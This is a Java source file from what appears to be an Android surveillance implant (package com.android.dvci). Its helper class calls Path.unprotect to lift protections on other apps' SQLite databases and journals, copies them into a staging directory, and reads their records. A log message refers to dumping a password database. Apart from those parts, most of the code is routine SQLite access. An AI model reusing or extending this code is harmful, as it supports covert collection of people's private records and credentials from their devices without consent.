package com.android.dvci.db;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteQueryBuilder;

import com.android.dvci.auto.Cfg;
import com.android.dvci.file.AutoFile;
import com.android.dvci.file.Path;
import com.android.dvci.util.Check;
import com.android.dvci.util.Utils;

import java.io.File;
import java.io.IOException;

/**
 * Helper to access sqlite db.
 *
 * @param <T>
 * @author zeno
 */
public class GenericSqliteHelper { // extends SQLiteOpenHelper {
	private static final String TAG = "GenericSqliteHelper";
	private static final int DB_VERSION = 4;
	public static Object lockObject = new Object();
	private String name = null;
	private SQLiteDatabase db;
	private boolean isCopy = false;

	public GenericSqliteHelper(String name, boolean isCopy) {
		this.name = name;
		this.isCopy = isCopy;
	}

	public GenericSqliteHelper(SQLiteDatabase db) {
		this.db = db;

	}

	/**
	 * Copy the db in a temp directory and opens it
	 *
	 * @param dbFile
	 * @return
	 */
	public static GenericSqliteHelper open(String dbFile) {
		File fs = new File(dbFile);
		return open(fs);
	}

	public static GenericSqliteHelper open(String databasePath, String dbfile) {
		File fs = new File(databasePath, dbfile);
		return open(fs);
	}

	private static GenericSqliteHelper open(File fs) {
		String dbFile = fs.getAbsolutePath();
		if (fs.exists() && Path.unprotect(dbFile, 4, false)) {
			return new GenericSqliteHelper(dbFile, false);
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (dumpPasswordDb) ERROR: no suitable db file");
			}
			return null;
		}
	}

	/**
	 * Copy the db in a temp directory and opens it
	 *
	 * @param dbFile
	 * @return
	 */
	public static GenericSqliteHelper openCopy(String dbFile) {

		File fs = new File(dbFile);
		dbFile = fs.getAbsolutePath();
		if (!(Path.unprotect(dbFile, 4, false) && fs.exists() && fs.canRead())) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (openCopy) ERROR: no suitable db file");
			}
			return null;
		}

		String localFile = Path.markup() + fs.getName();
		try {
			Utils.copy(new File(dbFile), new File(localFile));
		} catch (IOException e) {
			return null;
		}

		return new GenericSqliteHelper(localFile, true);

	}

	/**
	 * Copy the db in a temp directory and opens it
	 *
	 * @param pathSystem
	 * @param file
	 * @return
	 */
	public static GenericSqliteHelper openCopy(String pathSystem, String file) {
		return openCopy(new File(pathSystem, file).getAbsolutePath());
	}

	/*
	 * @Override public void onCreate(SQLiteDatabase db) { }
	 * 
	 * @Override public void onUpgrade(SQLiteDatabase db, int oldVersion, int
	 * newVersion) { if (Cfg.DEBUG) { Check.log(TAG + " (onUpgrade), old: " +
	 * oldVersion); } }
	 */

	public long traverseRawQuery(String sqlquery, String[] selectionArgs, RecordVisitor visitor) {
		synchronized (lockObject) {
			db = getReadableDatabase();
			Cursor cursor = db.rawQuery(sqlquery, selectionArgs);

			long ret = traverse(cursor, visitor, new String[]{});

			cursor.close();
			cursor = null;

			if (this.db != null) {
				db.close();
				db = null;
			}
			return ret;
		}
	}

	public long traverseRecords(String table, RecordVisitor visitor) {
		return traverseRecords(table,visitor,false);
	}

	/**
	 * Traverse all the records of a table on a projection. Visitor pattern
	 * implementation
	 *
	 * @param table
	 * @param visitor
	 */
	public long traverseRecords(String table, RecordVisitor visitor, boolean distinct) {
		synchronized (lockObject) {
			db = getReadableDatabase();
			SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();

			queryBuilderIndex.setTables(table);
			queryBuilderIndex.setDistinct(distinct);
			Cursor cursor = queryBuilderIndex.query(db, visitor.getProjection(), visitor.getSelection(), null, null,
					null, visitor.getOrder());

			long ret = traverse(cursor, visitor, new String[]{table});

			cursor.close();
			cursor = null;

			if (this.db != null) {
				db.close();
				db = null;
			}
			return ret;
		}
	}

	private long traverse(Cursor cursor, RecordVisitor visitor, String[] tables) {

		if (Cfg.DEBUG) {
			Check.log(TAG + " (traverseRecords)");
		}
		visitor.init(tables, cursor.getCount());

		long maxid = 0;
		// iterate conversation indexes
		while (cursor != null && cursor.moveToNext() && !visitor.isStopRequested()) {
			long id = -1;
			try {
				id = visitor.cursor(cursor);
			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (traverseRecords) Error: %s", ex);
				}
			}
			maxid = Math.max(id, maxid);
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (traverseRecords) maxid: " + maxid);
		}

		visitor.close();

		return maxid;

	}

	public synchronized SQLiteDatabase getReadableDatabase() {
		if (db != null && db.isOpen()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getReadableDatabase) already opened, closing it");
			}
			try {
				db.close();
			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getReadableDatabase), ERROR: " + ex);
				}
			}
		}
		try {
			Path.unprotect(name, 3, true);
			Path.unprotect(name + "-journal", true);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (getReadableDatabase) open");
			}

			AutoFile file = new AutoFile(name);
			if (file.exists()) {
				SQLiteDatabase opened = SQLiteDatabase.openDatabase(name, null, SQLiteDatabase.OPEN_READONLY
						| SQLiteDatabase.NO_LOCALIZED_COLLATORS);
				return opened;
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getReadableDatabase) Error: file does not exists");
				}
			}
		} catch (Throwable ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getReadableDatabase) Error: " + ex);
			}
		}

		return null;
	}

	public synchronized void disposeDb() {

		try {
			if (this.db != null && this.db.isOpen()) {
				this.db.close();
			}

			if (isCopy) {
				File file = new File(this.name);
				file.delete();
			}
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (disposeDb), ERROR: " + ex);
			}
		}

	}

}
